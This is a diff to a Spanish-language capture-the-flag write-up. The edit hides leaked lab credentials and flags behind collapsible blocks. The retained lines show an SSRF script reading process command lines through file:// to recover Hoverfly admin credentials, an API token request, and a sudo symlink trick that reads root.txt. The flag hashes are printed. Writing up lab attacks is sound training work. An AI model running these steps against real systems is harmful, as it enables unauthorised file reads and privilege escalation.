@@ -85,10 +85,16 @@ Content-ID: <root>
 ```bash
 # Buscar el PID de Hoverfly
 bash xop_ssrf.sh "file:///proc/1424/cmdline" | tr '\0' ' '
-# hoverfly -db boltdb -ap 8888 -pp 8500 -username admin -password O7IJ27MyyXiU
 ```
 
-Credenciales: **`admin:O7IJ27MyyXiU`**
+<details markdown="1">
+<summary>🔓 Ver credenciales filtradas</summary>
+
+```
+hoverfly -db boltdb -ap 8888 -pp 8500 -username admin -password O7IJ27MyyXiU
+```
+
+</details>
 
 ---
 
@@ -101,7 +107,7 @@ Hoverfly permite definir un middleware Python que intercepta cada petición que 
 ```bash
 TOKEN=$(curl -s -X POST http://10.129.244.208:8888/api/token-auth \
   -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' \
+  -d '{"username":"admin","password":"<contraseña>"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
 ```
 
@@ -137,8 +143,16 @@ Shell obtenida como `dev_ryan`. Flag de usuario:
 
 ```bash
 cat ~/user.txt
-# 11899580f8e859e4aab4d4d7e32b32b5
 ```
+
+<details markdown="1">
+<summary>🔓 Ver flag</summary>
+
+```
+11899580f8e859e4aab4d4d7e32b32b5
+```
+
+</details>
 
 ---
 
@@ -194,8 +208,16 @@ ln -s /opt/syswatch/logs/root.txt /opt/syswatch/logs/evil.log
 
 sudo /opt/syswatch/syswatch.sh logs evil.log
 cat /opt/syswatch/logs/root.txt
-# 584d7fc796a2c7df862a1a61e7d5d5fd
 ```
+
+<details markdown="1">
+<summary>🔓 Ver flag</summary>
+
+```
+584d7fc796a2c7df862a1a61e7d5d5fd
+```
+
+</details>
 
 ---
 
